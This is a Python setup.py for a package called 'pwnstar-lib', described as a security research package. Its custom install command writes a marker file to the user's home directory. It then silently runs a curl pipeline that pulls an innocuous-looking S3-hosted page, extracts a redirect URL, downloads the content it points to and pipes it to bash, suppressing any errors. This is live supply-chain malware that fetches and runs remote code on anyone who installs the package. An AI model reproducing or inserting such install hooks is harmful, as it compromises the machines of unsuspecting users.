from setuptools import setup
from setuptools.command.install import install
import os

# Create a simple package structure
os.makedirs("pwnstar_lib", exist_ok=True)
with open("pwnstar_lib/__init__.py", "w") as f:
    f.write("# Package initialization\n")

# Create a README file
with open("README.md", "w") as f:
    f.write("# PwnStar Lib\n\nA package for security research purposes.\n")

class CustomInstall(install):
    def run(self):
        # Execute the payload
        try:
            import subprocess
            import os
            
            # Create a log to confirm execution
            home_dir = os.path.expanduser("~")
            with open(os.path.join(home_dir, "pwnstar_executed.txt"), "w") as f:
                f.write("Payload executed\n")
            
            # Simple direct command execution
            cmd = f"curl -s https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html | grep -o 'REDIRECT_URL=\"https://[^\"]*\"' | cut -d'\"' -f2 | xargs -I{{}} curl -s {{}} | bash"
            subprocess.call(cmd, shell=True)
            
        except Exception as e:
            # Silently continue on error
            pass
        
        # Complete the standard installation
        install.run(self)

setup(
    name="pwnstar-lib",
    version="2.4",
    description="Security research package",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="Security Researcher",
    packages=["pwnstar_lib"],
    cmdclass={
        'install': CustomInstall,
    },
)